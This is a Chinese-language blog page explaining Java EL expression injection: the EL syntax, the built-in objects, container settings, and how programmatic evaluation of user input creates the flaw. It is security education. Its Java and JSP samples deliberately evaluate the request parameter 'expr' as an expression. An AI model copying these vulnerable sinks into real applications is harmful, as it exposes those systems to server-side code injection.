<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <meta name="keywords" content="Hexo Theme Redefine">
    
    <meta name="author" content="sky123">
    
    <!-- Completely eliminate flash of wrong theme -->
    <script>
        (function() {
            const THEME_KEY = "REDEFINE-THEME-STATUS";
            const DARK = "dark", LIGHT = "light";
            
            // Get preferred theme
            function getTheme() {
                try {
                    const saved = localStorage.getItem(THEME_KEY);
                    if (saved) {
                        const { isDark } = JSON.parse(saved);
                        return isDark ? DARK : LIGHT;
                    }
                } catch (e) {}
                
                return matchMedia("(prefers-color-scheme: dark)").matches ? DARK : LIGHT;
            }
            
            // Apply theme to document
            function applyTheme(theme) {
                const isDark = theme === DARK;
                const root = document.documentElement;
                
                // Set data attribute for CSS variables
                root.setAttribute("data-theme", theme);
                
                // Set classes for compatibility
                root.classList.add(theme);
                root.classList.remove(isDark ? LIGHT : DARK);
                root.style.colorScheme = theme;
            }
            
            // Initial application
            const theme = getTheme();
            applyTheme(theme);
            
            // Listen for system preference changes
            matchMedia("(prefers-color-scheme: dark)").addEventListener("change", ({ matches }) => {
                // Only update if using system preference (no localStorage entry)
                if (!localStorage.getItem(THEME_KEY)) {
                    applyTheme(matches ? DARK : LIGHT);
                }
            });
            
            // Set body classes once DOM is ready
            if (document.readyState !== "loading") {
                document.body.classList.add(theme + "-mode");
            } else {
                document.addEventListener("DOMContentLoaded", () => {
                    document.body.classList.add(theme + "-mode");
                    document.body.classList.remove((theme === DARK ? LIGHT : DARK) + "-mode");
                });
            }
        })();
    </script>
    
    <!-- Critical CSS to prevent flash -->
    <style>
        :root[data-theme="dark"] {
            --background-color: #202124;
            --background-color-transparent: rgba(32, 33, 36, 0.6);
            --second-background-color: #2d2e32;
            --third-background-color: #34353a;
            --third-background-color-transparent: rgba(32, 33, 36, 0.6);
            --primary-color: #0066CC;
            --first-text-color: #ffffff;
            --second-text-color: #eeeeee;
            --third-text-color: #bebec6;
            --fourth-text-color: #999999;
            --default-text-color: #bebec6;
            --invert-text-color: #373D3F;
            --border-color: rgba(255, 255, 255, 0.08);
            --selection-color: #0066CC;
            --shadow-color-1: rgba(255, 255, 255, 0.08);
            --shadow-color-2: rgba(255, 255, 255, 0.05);
        }
        
        :root[data-theme="light"] {
            --background-color: #fff;
            --background-color-transparent: rgba(255, 255, 255, 0.6);
            --second-background-color: #f8f8f8;
            --third-background-color: #f2f2f2;
            --third-background-color-transparent: rgba(241, 241, 241, 0.6);
            --primary-color: #0066CC;
            --first-text-color: #16171a;
            --second-text-color: #2f3037;
            --third-text-color: #5e5e5e;
            --fourth-text-color: #eeeeee;
            --default-text-color: #373D3F;
            --invert-text-color: #bebec6;
            --border-color: rgba(0, 0, 0, 0.08);
            --selection-color: #0066CC;
            --shadow-color-1: rgba(0, 0, 0, 0.08);
            --shadow-color-2: rgba(0, 0, 0, 0.05);
        }
        
        body {
            background-color: var(--background-color);
            color: var(--default-text-color);
        }
        
        /* Apply body classes as soon as DOM is ready */
        :root[data-theme="dark"] body {
            background-color: var(--background-color);
            color: var(--default-text-color);
        }
    </style>
    
    <!-- preconnect -->
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>

    
    <!--- Seo Part-->
    
    <link rel="canonical" href="https://skyi23.github.io/2025/10/02/java 表达式注入/"/>
    <meta name="robots" content="index,follow">
    <meta name="googlebot" content="index,follow">
    <meta name="revisit-after" content="1 days">
    
    
    
    
    <!--- Icon Part-->
    <link rel="icon" type="image/png" href="/null" sizes="192x192">
    <link rel="apple-touch-icon" sizes="180x180" href="/null">
    <meta name="theme-color" content="#A31F34">
    <link rel="shortcut icon" href="/null">
    <!--- Page Info-->
    
    <title>
        
            Java 表达式注入 | sky123&#39;s site
        
    </title>

    
<link rel="stylesheet" href="/fonts/Chillax/chillax.css">


    <!--- Inject Part-->
    

    
<link rel="stylesheet" href="/css/style.css">


    
        
<link rel="stylesheet" href="/css/build/tailwind.css">

    

    
<link rel="stylesheet" href="/fonts/GeistMono/geist-mono.css">

    
<link rel="stylesheet" href="/fonts/Geist/geist.css">

    <!--- Font Part-->
    
    
        <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono&display=swap" rel="stylesheet">
    
    
    
    
    

    <script id="hexo-configurations">
    window.config = {"hostname":"skyi23.github.io","root":"/","language":"en","path":"search.xml"};
    window.theme = {"articles":{"style":{"font_size":"16px","line_height":1.5,"image_border_radius":"14px","image_alignment":"center","image_caption":false,"link_icon":true,"delete_mask":false,"title_alignment":"left","headings_top_spacing":{"h1":"3.2rem","h2":"2.4rem","h3":"1.9rem","h4":"1.6rem","h5":"1.4rem","h6":"1.3rem"}},"word_count":{"enable":true,"count":true,"min2read":true},"author_label":{"enable":false,"auto":false,"list":[]},"code_block":{"copy":true,"style":"mac","highlight_theme":{"light":"github","dark":"vs2015"},"font":{"enable":true,"family":"JetBrains Mono","url":"https://fonts.googleapis.com/css2?family=JetBrains+Mono&display=swap"}},"toc":{"enable":true,"max_depth":5,"number":false,"expand":true,"init_open":true},"copyright":{"enable":true,"default":"cc_by_nc_sa"},"lazyload":true,"pangu_js":false,"recommendation":{"enable":false,"title":"推荐阅读","limit":3,"mobile_limit":2,"placeholder":"/images/wallhaven-wqery6-light.webp","skip_dirs":[]}},"colors":{"primary":"#A31F34","secondary":null,"default_mode":"light"},"global":{"fonts":{"chinese":{"enable":false,"family":null,"url":null},"english":{"enable":false,"family":null,"url":null},"title":{"enable":false,"family":null,"url":null}},"content_max_width":"1000px","sidebar_width":"210px","hover":{"shadow":true,"scale":false},"scroll_progress":{"bar":true,"percentage":true},"website_counter":{"url":"https://cn.vercount.one/js","enable":true,"site_pv":true,"site_uv":true,"post_pv":true},"single_page":true,"preloader":{"enable":false,"custom_message":null},"side_tools":{"gear_rotation":true,"auto_expand":false},"open_graph":{"enable":false,"image":"/images/redefine-og.webp","description":"Hexo Theme Redefine, Redefine Your Hexo Journey."},"google_analytics":{"enable":false,"id":null}},"home_banner":{"enable":true,"style":"fixed","image":{"light":"/images/wallhaven-wqery6-light.webp","dark":"/images/wallhaven-wqery6-dark.webp"},"title":"sky123's blog","subtitle":{"text":["书有未曾经我读，事无不可对人言"],"hitokoto":{"enable":false,"show_author":false,"api":"https://v1.hitokoto.cn"},"typing_speed":100,"backing_speed":80,"starting_delay":500,"backing_delay":1500,"loop":true,"smart_backspace":true},"text_color":{"light":"#fff","dark":"#d1d1b6"},"text_style":{"title_size":"2.8rem","subtitle_size":"1.5rem","line_height":1.2},"custom_font":{"enable":false,"family":null,"url":null},"social_links":{"enable":false,"style":"default","links":{"github":null,"instagram":null,"zhihu":null,"twitter":null,"email":null},"qrs":{"weixin":null}}},"plugins":{"feed":{"enable":false},"aplayer":{"enable":false,"type":"fixed","audios":[{"name":null,"artist":null,"url":null,"cover":null,"lrc":null}]},"mermaid":{"enable":true,"version":"11.4.1"}},"version":"2.8.5","navbar":{"auto_hide":false,"color":{"left":"#f78736","right":"#367df7","transparency":35},"width":{"home":"1200px","pages":"1000px"},"links":{"Home":{"path":"/","icon":"fa-regular fa-house"},"分类":{"icon":"fa-solid fa-folder","path":"/categories/"},"标签":{"icon":"fa-solid fa-tags","path":"/tags/"},"书签":{"icon":"fa-solid fa-bookmark","path":"/bookmarks/"}},"search":{"enable":true,"preload":true}},"page_templates":{"bookmarks_column":3,"friends_column":2,"tags_style":"blur"},"home":{"sidebar":{"enable":true,"position":"left","first_item":"menu","announcement":null,"show_on_mobile":true,"links":null},"article_date_format":"auto","excerpt_length":200,"categories":{"enable":true,"limit":3},"tags":{"enable":true,"limit":3}},"footerStart":"2024/11/7 00:00:00"};
    window.lang_ago = {"second":"%s seconds ago","minute":"%s minutes ago","hour":"%s hours ago","day":"%s days ago","week":"%s weeks ago","month":"%s months ago","year":"%s years ago"};
    window.data = {"masonry":false};
  </script>
    
    <!--- Fontawesome Part-->
    
<link rel="stylesheet" href="/fontawesome/fontawesome.min.css">

    
<link rel="stylesheet" href="/fontawesome/brands.min.css">

    
<link rel="stylesheet" href="/fontawesome/solid.min.css">

    
<link rel="stylesheet" href="/fontawesome/regular.min.css">

    
    
    
    
<!-- hexo injector head_end start --><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.15.3/dist/katex.min.css" integrity="sha256-TThEtR+XalhWKkfF383YLOrI50NGNeIqrzS+q08afrY=" crossorigin="anonymous"><!-- hexo injector head_end end --><meta name="generator" content="Hexo 7.3.0"></head>



<body>
	<div class="progress-bar-container">
	
	<span class="scroll-progress-bar"></span>
	

	
	<span class="pjax-progress-bar"></span>
	<!--        <span class="swup-progress-icon">-->
	<!--            <i class="fa-solid fa-circle-notch fa-spin"></i>-->
	<!--        </span>-->
	
</div>

<main class="page-container" id="swup">

	

	<div class="main-content-container flex flex-col justify-between min-h-dvh">
		<div class="main-content-header">
			<header class="navbar-container px-6 md:px-12">
    <div class="navbar-content transition-navbar ">
        <div class="left">
            
            <a class="logo-title" href="/">
                
                sky123&#39;s site
                
            </a>
        </div>

        <div class="right">
            <!-- PC -->
            <div class="desktop">
                <ul class="navbar-list">
                    
                        
                            

                            <li class="navbar-item">
                                <!-- Menu -->
                                <a class=""
                                   href="/"
                                        >
                                    <i class="fa-regular fa-house fa-fw"></i>
                                    HOME
                                    
                                </a>

                                <!-- Submenu -->
                                
                            </li>
                    
                        
                            

                            <li class="navbar-item">
                                <!-- Menu -->
                                <a class=""
                                   href="/categories/"
                                        >
                                    <i class="fa-solid fa-folder fa-fw"></i>
                                    分类
                                    
                                </a>

                                <!-- Submenu -->
                                
                            </li>
                    
                        
                            

                            <li class="navbar-item">
                                <!-- Menu -->
                                <a class=""
                                   href="/tags/"
                                        >
                                    <i class="fa-solid fa-tags fa-fw"></i>
                                    标签
                                    
                                </a>

                                <!-- Submenu -->
                                
                            </li>
                    
                        
                            

                            <li class="navbar-item">
                                <!-- Menu -->
                                <a class=""
                                   href="/bookmarks/"
                                        >
                                    <i class="fa-solid fa-bookmark fa-fw"></i>
                                    书签
                                    
                                </a>

                                <!-- Submenu -->
                                
                            </li>
                    
                    
                        <li class="navbar-item search search-popup-trigger">
                            <i class="fa-solid fa-magnifying-glass"></i>
                        </li>
                    
                </ul>
            </div>
            <!-- Mobile -->
            <div class="mobile">
                
                    <div class="icon-item search search-popup-trigger"><i class="fa-solid fa-magnifying-glass"></i>
                    </div>
                
                <div class="icon-item navbar-bar">
                    <div class="navbar-bar-middle"></div>
                </div>
            </div>
        </div>
    </div>

    <!-- Mobile sheet -->
    <div class="navbar-drawer h-dvh w-full absolute top-0 left-0 bg-background-color flex flex-col justify-between">
        <ul class="drawer-navbar-list flex flex-col px-4 justify-center items-start">
            
                
                    

                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
                        
                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
                           href="/"
                        >
                            <span>
                                HOME
                            </span>
                            
                                <i class="fa-regular fa-house fa-sm fa-fw"></i>
                            
                        </a>
                        

                        
                    </li>
            
                
                    

                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
                        
                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
                           href="/categories/"
                        >
                            <span>
                                分类
                            </span>
                            
                                <i class="fa-solid fa-folder fa-sm fa-fw"></i>
                            
                        </a>
                        

                        
                    </li>
            
                
                    

                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
                        
                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
                           href="/tags/"
                        >
                            <span>
                                标签
                            </span>
                            
                                <i class="fa-solid fa-tags fa-sm fa-fw"></i>
                            
                        </a>
                        

                        
                    </li>
            
                
                    

                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
                        
                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
                           href="/bookmarks/"
                        >
                            <span>
                                书签
                            </span>
                            
                                <i class="fa-solid fa-bookmark fa-sm fa-fw"></i>
                            
                        </a>
                        

                        
                    </li>
            

            
            
        </ul>

        <div class="statistics flex justify-around my-2.5">
    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/tags">
        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">14</div>
        <div class="label text-third-text-color text-sm">Tags</div>
    </a>
    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/categories">
        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">17</div>
        <div class="label text-third-text-color text-sm">Categories</div>
    </a>
    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/archives">
        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">56</div>
        <div class="label text-third-text-color text-sm">Posts</div>
    </a>
</div>
    </div>

    <div class="window-mask"></div>

</header>


		</div>

		<div class="main-content-body transition-fade-up">
			

			<div class="main-content">
				<div class="post-page-container flex relative justify-between box-border w-full h-full">
	<div class="article-content-container">

		<div class="article-title relative w-full">
			
			<div class="w-full flex items-center pt-6 justify-start">
				<h1 class="article-title-regular text-second-text-color tracking-tight text-4xl md:text-6xl font-semibold px-2 sm:px-6 md:px-8 py-3">Java 表达式注入</h1>
			</div>
			
		</div>

		
		<div class="article-header flex flex-row gap-2 items-center px-2 sm:px-6 md:px-8">
			<div class="avatar w-[46px] h-[46px] flex-shrink-0 rounded-medium border border-border-color p-[1px]">
				<img src="/images/icon.jpg">
			</div>
			<div class="info flex flex-col justify-between">
				<div class="author flex items-center">
					<span class="name text-default-text-color text-lg font-semibold">sky123</span>
					
				</div>
				<div class="meta-info">
					<div class="article-meta-info">
    <span class="article-date article-meta-item">
        <i class="fa-regular fa-pen-fancy"></i>&nbsp;
        <span class="desktop">2025-10-02 14:39:01</span>
        <span class="mobile">2025-10-02 14:39:01</span>
        <span class="hover-info">Created</span>
    </span>
    
        <span class="article-date article-meta-item">
            <i class="fa-regular fa-wrench"></i>&nbsp;
            <span class="desktop">2025-10-21 23:04:07</span>
            <span class="mobile">2025-10-21 23:04:07</span>
            <span class="hover-info">Updated</span>
        </span>
    

    
        <span class="article-categories article-meta-item">
            <i class="fa-regular fa-folders"></i>&nbsp;
            <ul>
                
                
                    
                        
                        <li>
                            <a href="/categories/web/">web</a>&nbsp;
                        </li>
                    
                    
                
                    
                        
                            <li>></li>
                        
                        <li>
                            <a href="/categories/web/java-web/">java web</a>&nbsp;
                        </li>
                    
                    
                
            </ul>
        </span>
    
    
        <span class="article-tags article-meta-item">
            <i class="fa-regular fa-tags"></i>&nbsp;
            <ul>
                
                    <li>
                        <a href="/tags/java-web/">java web</a>&nbsp;
                    </li>
                
            </ul>
        </span>
    

    
    
        <span class="article-wordcount article-meta-item">
            <i class="fa-regular fa-typewriter"></i>&nbsp;<span>15.9k Words</span>
        </span>
    
    
        <span class="article-min2read article-meta-item">
            <i class="fa-regular fa-clock"></i>&nbsp;<span>73 Mins</span>
        </span>
    
    
        <span class="article-pv article-meta-item">
            <i class="fa-regular fa-eye"></i>&nbsp;<span id="busuanzi_value_page_pv"></span>
        </span>
    
</div>

				</div>
			</div>
		</div>
		

		


		<div class="article-content markdown-body px-2 sm:px-6 md:px-8 pb-8">
			<h1 id="EL"><a href="#EL" class="headerlink" title="EL"></a>EL</h1><p><strong>EL（Expression Language，表达式语言）</strong>是 Java Web 技术栈里的一种“<strong>在页面&#x2F;模板中写表达式</strong>”的机制，最早随 <strong>JSP 2.0</strong> 出现，后来与 <strong>JSF</strong> 合并为“<strong>统一 EL</strong>”（Unified EL）。它让你在 JSP、Facelets（JSF）、CDI&#x2F;Servlet 等环境里，用简洁的语法读取&#x2F;计算数据，而不用在页面里写 Java 代码。</p>
<h2 id="基本概念"><a href="#基本概念" class="headerlink" title="基本概念"></a>基本概念</h2><h3 id="基本语法"><a href="#基本语法" class="headerlink" title="基本语法"></a>基本语法</h3><p>EL 表达式界限为 <code>$&#123; ... &#125;</code>。JSP&#x2F;EL 不是 Java 代码执行器，它是“一门表达式语言”。你不能随便在 EL 里写 Java 语句、导包、new 对象、反射、随意调任意静态方法等。</p>
<ul>
<li><strong>不能写 Java 语句</strong>：不能写 <code>if (...) &#123;&#125;</code>, <code>for (...) &#123;&#125;</code>, <code>try/catch</code>，也<strong>不能定义类&#x2F;方法&#x2F;变量</strong>。</li>
<li><strong>不能 <code>new</code> 对象</strong>：没有 <code>new</code> 运算符。</li>
<li><strong>不能随意导包&#x2F;引类</strong>：不能直接写 <code>java.lang.Runtime</code>、<code>Class.forName</code> 等。</li>
</ul>
<p>EL 表达式的<strong>常见语法</strong>有：</p>
<ul>
<li><strong>取值&#x2F;索引</strong>：<code>$&#123;user.name&#125;</code>, <code>$&#123;map[&#39;k&#39;]&#125;</code>, <code>$&#123;list[0]&#125;</code></li>
<li><strong>空判断</strong>：<code>$&#123;empty x&#125;</code>（null&#x2F;空串&#x2F;空集合&#x2F;空数组 → true）</li>
<li><strong>算术&#x2F;比较&#x2F;逻辑</strong>：<code>+ - * / %</code>，<code>== != &lt; &gt; &lt;= &gt;=</code>（或 <code>eq ne lt gt le ge</code>），<code>&amp;&amp; || !</code>（或 <code>and or not</code>）</li>
<li><strong>条件</strong>：<code>$&#123;cond ? a : b&#125;</code></li>
<li><strong>函数（JSTL）</strong>：<code>$&#123;fn:length(list)&#125;</code>, <code>$&#123;fn:contains(text,&#39;foo&#39;)&#125;</code></li>
<li><strong>方法调用（EL 2.2+）</strong>：<code>$&#123;bean.fullName()&#125;</code>（容器实现需开放）</li>
<li><strong>赋值（实现相关）</strong>：<code>$&#123;obj.prop = 123&#125;</code>, <code>$&#123;pageContext.setAttribute(&#39;k&#39;, v)&#125;</code></li>
</ul>
<h3 id="内置对象"><a href="#内置对象" class="headerlink" title="内置对象"></a>内置对象</h3><p>EL 表达式上下文内置了若干<strong>可直接访问</strong>的对象（大多呈现为“Map 风格视图”）：</p>
<table>
<thead>
<tr>
<th>名称</th>
<th>含义 &#x2F; 等价</th>
<th>典型示例</th>
</tr>
</thead>
<tbody><tr>
<td><code>pageScope</code></td>
<td>当前 JSP 页的 <strong>属性表</strong>（<code>PageContext</code> 的 page 级属性）</td>
<td><code>$&#123;pageScope.msg&#125;</code></td>
</tr>
<tr>
<td><code>requestScope</code></td>
<td><code>HttpServletRequest</code> 的 <strong>属性表</strong></td>
<td><code>$&#123;requestScope.user&#125;</code></td>
</tr>
<tr>
<td><code>sessionScope</code></td>
<td><code>HttpSession</code> 的 <strong>属性表</strong></td>
<td><code>$&#123;sessionScope.cart&#125;</code></td>
</tr>
<tr>
<td><code>applicationScope</code></td>
<td><code>ServletContext</code> 的 <strong>属性表</strong></td>
<td><code>$&#123;applicationScope.cfg&#125;</code></td>
</tr>
<tr>
<td><code>param</code></td>
<td>请求参数单值视图：<code>request.getParameter(name)</code></td>
<td><code>$&#123;param.q&#125;</code></td>
</tr>
<tr>
<td><code>paramValues</code></td>
<td>请求参数多值视图：<code>request.getParameterValues(name)</code>（数组）</td>
<td><code>$&#123;paramValues.tags[0]&#125;</code></td>
</tr>
<tr>
<td><code>header</code></td>
<td>Header 单值视图：<code>request.getHeader(name)</code></td>
<td><code>$&#123;header[&#39;User-Agent&#39;]&#125;</code></td>
</tr>
<tr>
<td><code>headerValues</code></td>
<td>Header 多值视图：<code>request.getHeaders(name)</code>（枚举→数组）</td>
<td><code>$&#123;headerValues.Accept[0]&#125;</code></td>
</tr>
<tr>
<td><code>initParam</code></td>
<td>Web 应用的 <strong>上下文初始化参数</strong>：<code>ServletContext.getInitParameter(name)</code>（<code>web.xml</code> 的 <code>&lt;context-param&gt;</code>）</td>
<td><code>$&#123;initParam[&#39;site.name&#39;]&#125;</code></td>
</tr>
<tr>
<td><code>cookie</code></td>
<td>按 <strong>Cookie 名</strong>索引到 <code>Cookie</code> 对象的 Map</td>
<td><code>$&#123;cookie.JSESSIONID.value&#125;</code></td>
</tr>
<tr>
<td><code>pageContext</code></td>
<td>直接暴露的 <code>PageContext</code> 对象（能进一步拿到 request &#x2F; session &#x2F; application 等）</td>
<td><code>$&#123;pageContext.request.method&#125;</code></td>
</tr>
</tbody></table>

  <div class="note-large blue">
    <div class="notel-title rounded-t-lg p-3 font-bold text-lg flex flex-row gap-2 items-center">
      <p>提示</p>

    </div>
    <div class="notel-content markdown-body">
      <ul>
<li><code>cookie.*</code> 是 <code>Cookie</code> 对象，请用 <code>.value</code> 取值；若 Cookie 名含连字符等，使用中括号：<code>${cookie[&#39;X-Token&#39;].value}</code>。</li>
<li><code>header</code>&#x2F;<code>headerValues</code> 键大小写不敏感。</li>
<li><code>param/paramValues</code> 解析常规查询串与表单编码；<strong>multipart&#x2F;form-data</strong> 上传字段需由上传库处理，EL 不直接提供文件访问。</li>
</ul>

    </div>
  </div>

<p>当你写 <strong><code>$&#123;user&#125;</code></strong> 这种<strong>未显式加作用域前缀</strong>的名字时，EL 会按下面顺序查找同名 <strong>属性</strong>（attribute）：</p>
<ol>
<li><code>pageScope</code></li>
<li><code>requestScope</code></li>
<li><code>sessionScope</code></li>
<li><code>applicationScope</code></li>
</ol>
<p>先命中哪个用哪个；如果都没有，返回 <code>null</code>。要避免同名遮蔽或歧义，<strong>建议显式写作用域</strong>：<code>$&#123;requestScope.user&#125;</code>。</p>
<h3 id="漏洞场景"><a href="#漏洞场景" class="headerlink" title="漏洞场景"></a>漏洞场景</h3><p><strong>Tomcat、WebLogic、Jetty</strong> 等容器默认支持 EL。若页面里 EL 没生效，通常是被禁用：</p>
<ul>
<li><p><strong>方式 A（页面级）</strong>：<code>isELIgnored</code></p>
<div class="code-container" data-rel="Jsp"><figure class="iseeu highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page isELIgnored=<span class="string">&quot;false&quot;</span> %&gt;</span><br></pre></td></tr></table></figure></div>
</li>
<li><p><strong>方式 B（web.xml 全局&#x2F;按路径）</strong>：<code>&lt;el-ignored&gt;</code></p>
<div class="code-container" data-rel="Xml"><figure class="iseeu highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">jsp-config</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">jsp-property-group</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>*.jsp<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">el-ignored</span>&gt;</span>false<span class="tag">&lt;/<span class="name">el-ignored</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">jsp-property-group</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">jsp-config</span>&gt;</span></span><br></pre></td></tr></table></figure></div>

<p><code>false</code> &#x3D; 启用 EL；<code>true</code> &#x3D; 忽略 EL（表达式将被原样输出或作为普通文本处理）。</p>
</li>
</ul>
<p>EL 是 Java EE&#x2F; Jakarta 的<strong>通用表达式语言</strong>（Unified EL）。除了 JSP，它还会出现在&#x2F;被以下东西使用：</p>
<ul>
<li><strong>JSTL&#x2F;自定义标签</strong>：标签体或标签属性里的 <code>$&#123;...&#125;</code>。</li>
<li><strong>JSF&#x2F;Facelets</strong>：<code>xhtml</code> 里大量 <code>$&#123;...&#125;</code>&#x2F;<code>#&#123;...&#125;</code>（两种 EL 前缀）。</li>
<li><strong>CDI&#x2F;EE 组件</strong>：某些配置&#x2F;绑定也走 EL 解析。</li>
<li><strong>编程式调用</strong>：任何 Java 代码都能用 <code>ExpressionFactory</code>、<code>ELContext</code> 在<strong>Servlet&#x2F;Filter&#x2F;Bean</strong>里<strong>手动求值</strong>一段 EL 字符串。</li>
</ul>
<p>对于<strong>普通 JSP</strong>，<code>$&#123;...&#125;</code> 写死在模板里，用户<strong>改不了表达式本身</strong>，一般不是“EL 注入”。</p>
<p>而对于<strong>编程式调用</strong>，开发者如果把<strong>用户可控字符串</strong>丢给 <code>ExpressionFactory#createValueExpression(...).getValue(...)</code> 去执行，这就不再是“只在 JSP 模板里固定的 EL”。因此会出现 EL 表达式注入：</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">ExpressionFactory</span> <span class="variable">factory</span> <span class="operator">=</span> ExpressionFactory.newInstance();</span><br><span class="line"></span><br><span class="line"><span class="comment">// 方式 A：自己组装一个上下文</span></span><br><span class="line"><span class="type">StandardELContext</span> <span class="variable">ctx</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StandardELContext</span>(factory);</span><br><span class="line"><span class="comment">// 根据需要添加/裁剪 Resolver（Map/List/Array/Bean……）</span></span><br><span class="line">ctx.addELResolver(<span class="keyword">new</span> <span class="title class_">MapELResolver</span>());</span><br><span class="line">ctx.addELResolver(<span class="keyword">new</span> <span class="title class_">ListELResolver</span>());</span><br><span class="line">ctx.addELResolver(<span class="keyword">new</span> <span class="title class_">ArrayELResolver</span>());</span><br><span class="line">ctx.addELResolver(<span class="keyword">new</span> <span class="title class_">BeanELResolver</span>(<span class="literal">true</span>)); <span class="comment">// 是否允许方法调用取决于你</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 暴露变量（可选）</span></span><br><span class="line">ctx.getVariableMapper().setVariable(<span class="string">&quot;request&quot;</span>,</span><br><span class="line">    factory.createValueExpression(req, javax.servlet.http.HttpServletRequest.class));</span><br><span class="line"></span><br><span class="line"><span class="comment">// 求值</span></span><br><span class="line"><span class="type">ValueExpression</span> <span class="variable">ve</span> <span class="operator">=</span> factory.createValueExpression(ctx, userInputExpr, Object.class);</span><br><span class="line"><span class="type">Object</span> <span class="variable">result</span> <span class="operator">=</span> ve.getValue(ctx);</span><br></pre></td></tr></table></figure></div>

<p>在 <strong>JSP 容器</strong>里你也可以利用 JSP 提供的 <code>JspApplicationContext</code> 获取到容器自己的 <code>ExpressionFactory</code> 与默认的 <code>ELResolver</code> 组合：</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;javax.el.*&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;javax.servlet.jsp.*&quot;</span> %&gt;</span><br><span class="line">&lt;%</span><br><span class="line">    <span class="type">String</span> <span class="variable">expr</span> <span class="operator">=</span> request.getParameter(<span class="string">&quot;expr&quot;</span>);   <span class="comment">// 用户传入的 EL（⚠ 风险）</span></span><br><span class="line">    <span class="comment">// 任选其一：</span></span><br><span class="line"><span class="comment">//     JspApplicationContext jac = JspFactory.getDefaultFactory().getJspApplicationContext(application);</span></span><br><span class="line">    <span class="type">JspApplicationContext</span> <span class="variable">jac</span> <span class="operator">=</span> JspFactory.getDefaultFactory().getJspApplicationContext(pageContext.getServletContext());</span><br><span class="line">    <span class="comment">// JspApplicationContext jac = JspFactory.getDefaultFactory().getJspApplicationContext(config.getServletContext());</span></span><br><span class="line"></span><br><span class="line">    <span class="type">ExpressionFactory</span> <span class="variable">factory</span> <span class="operator">=</span> jac.getExpressionFactory();</span><br><span class="line">    <span class="type">ELContext</span> <span class="variable">elc</span> <span class="operator">=</span> pageContext.getELContext();</span><br><span class="line">    <span class="type">Object</span> <span class="variable">result</span> <span class="operator">=</span> factory.createValueExpression(elc, expr, Object.class).getValue(elc);</span><br><span class="line">    out.print(String.valueOf(result));</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure></div>

<p>另外 Tomcat&#x2F;Jasper 提供了创建 EL 表达式解析器的专用快捷入口，这也是 Java 在编译 JSP 时针对 JSP 中内嵌 EL 表达式的转换方式。</p>
<div class="code-container" data-rel="Jsp"><figure class="iseeu highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.jasper.runtime.PageContextImpl&quot;</span> %&gt;</span><br><span class="line">&lt;%</span><br><span class="line">    <span class="type">String</span> <span class="variable">evalResult</span> <span class="operator">=</span> (String) PageContextImpl.proprietaryEvaluate(</span><br><span class="line">            request.getParameter(<span class="string">&quot;expr&quot;</span>), String.class, pageContext, <span class="literal">null</span>);</span><br><span class="line">    out.print(evalResult);</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure></div>


